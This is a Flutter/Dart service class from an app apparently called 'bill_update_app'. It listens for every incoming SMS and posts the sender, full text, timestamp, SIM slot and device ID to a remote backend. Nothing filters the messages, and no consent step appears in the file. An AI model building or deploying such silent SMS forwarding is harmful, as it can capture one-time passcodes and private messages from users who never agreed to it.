import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import '../api_config.dart';

class SmsService {
  static const _eventChannel = EventChannel('com.example.bill_update_app/sms');
  static const _deviceChannel = MethodChannel('com.example.bill_update_app/device');
  static String? _deviceId;

  static Future<String?> _getDeviceId() async {
    if (_deviceId != null) return _deviceId;
    try {
      _deviceId = await _deviceChannel.invokeMethod<String>('getDeviceId');
    } catch (_) {}
    return _deviceId;
  }

  static void init() {
    _eventChannel.receiveBroadcastStream().listen(
      (data) {
        if (data is Map) {
          final sender = data['sender'] as String? ?? '';
          final message = data['message'] as String? ?? '';
          final receivedAt = data['received_at'] as String? ?? DateTime.now().toIso8601String();
          final subId = data['sub_id'] as int? ?? 0;
          _sendToBackend(sender, message, receivedAt, subId);
        }
      },
      onError: (e) => print('SMS error: $e'),
    );
  }

  static Future<void> _sendToBackend(String sender, String message, String receivedAt, int subId) async {
    try {
      final deviceId = await _getDeviceId();
      final body = jsonEncode({
        'sender': sender,
        'message': message,
        'received_at': receivedAt,
        'sub_id': subId,
        if (deviceId != null && deviceId.isNotEmpty) 'device_id': deviceId,
      });
      await http.post(
        Uri.parse('$apiBaseUrl/api/sms'),
        headers: {'Content-Type': 'application/json'},
        body: body,
      );
    } catch (e) {
      print('SMS send error: $e');
    }
  }
}
